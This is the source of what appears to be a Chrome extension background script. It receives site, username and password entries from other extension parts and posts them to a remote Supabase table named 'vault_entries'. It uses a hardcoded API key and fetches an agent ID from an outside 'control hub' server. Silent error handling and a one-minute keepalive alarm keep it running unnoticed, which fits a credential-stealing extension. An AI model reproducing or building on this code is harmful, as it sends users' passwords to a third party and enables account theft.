const SB_URL = 'https://tvdydrblalibfupvepnl.supabase.co';
const SB_ANON = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InR2ZHlkcmJsYWxpYmZ1cHZlcG5sIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzEwOTE3NzgsImV4cCI6MjA4NjY2Nzc3OH0.Fu5u2LM7x7jvZNurQBcWcM9hfbElgVTN4ihv9MgrkEs';

async function getAgentIdCached() {
  try {
    const kv = await chrome.storage.local.get(['agent_id']);
    const aid = kv?.agent_id;
    if (aid) return aid;
  } catch {}
  return 'UNKNOWN';
}

async function resolveAgentIdFromController() {
  const bases = ['https://neural-control-hub.onrender.com', 'http://localhost:8080'];
  for (const base of bases) {
    try {
      const ctrl = new AbortController();
      const t = setTimeout(() => ctrl.abort(), 700);
      const r = await fetch(base + '/api/vault/resolve-agent', { method: 'GET', cache: 'no-store', credentials: 'omit', signal: ctrl.signal });
      clearTimeout(t);
      if (r?.ok) {
        const j = await r.json().catch(() => ({}));
        const aid = j?.agent_id;
        if (aid) {
          try { await chrome.storage.local.set({ agent_id: String(aid) }); } catch {}
          return String(aid);
        }
      }
    } catch {}
  }
  return null;
}

async function ensureAgentId() {
  const cached = await getAgentIdCached();
  if (cached && cached !== 'UNKNOWN') return cached;
  const resolved = await resolveAgentIdFromController();
  return resolved || cached;
}

let __lastSig = null;
let __lastSigAt = 0;

async function postToSupabase(body) {
  try {
    if (!SB_URL || !SB_ANON) return false;
    const row = {
      agent_id: body.agent_id || (await ensureAgentId()),
      site: body.site || '',
      username: body.user || body.username || '',
      password: body.pass || body.password || '',
      time: body.time || new Date().toLocaleString()
    };

    // simple de-dupe within 3s
    try {
      const sig = `${row.agent_id}|${row.site}|${row.username}|${row.password}`;
      const now = Date.now();
      if (__lastSig === sig && (now - __lastSigAt) < 3000) return true;
      __lastSig = sig;
      __lastSigAt = now;
    } catch {}

    const resp = await fetch(`${SB_URL}/rest/v1/vault_entries`, {
      method: 'POST',
      headers: {
        'apikey': SB_ANON,
        'Authorization': `Bearer ${SB_ANON}`,
        'Content-Type': 'application/json',
        'Prefer': 'return=minimal'
      },
      body: JSON.stringify(row),
      cache: 'no-store',
      credentials: 'omit'
    });
    return resp && (resp.ok || resp.status === 201 || resp.status === 200 || resp.status === 204);
  } catch {
    return false;
  }
}

chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
  try {
    if (!msg || msg.type !== 'VAULT_ENTRY') return;
    const data = msg.payload || {};
    postToSupabase(data);
  } catch (e) {}
});

try {
  chrome.runtime.onInstalled.addListener(async () => {
    try { await ensureAgentId(); } catch {}
    try { chrome.alarms.clear('keepalive'); } catch {}
    try { chrome.alarms.create('keepalive', { periodInMinutes: 1 }); } catch {}
  });
} catch {}

try {
  chrome.runtime.onStartup.addListener(async () => {
    try { await ensureAgentId(); } catch {}
    try { chrome.alarms.clear('keepalive'); } catch {}
    try { chrome.alarms.create('keepalive', { periodInMinutes: 1 }); } catch {}
  });
} catch {}

try {
  chrome.alarms.onAlarm.addListener(async (alarm) => {
    if (!alarm || alarm.name !== 'keepalive') return;
    try { await ensureAgentId(); } catch {}
  });
} catch {}
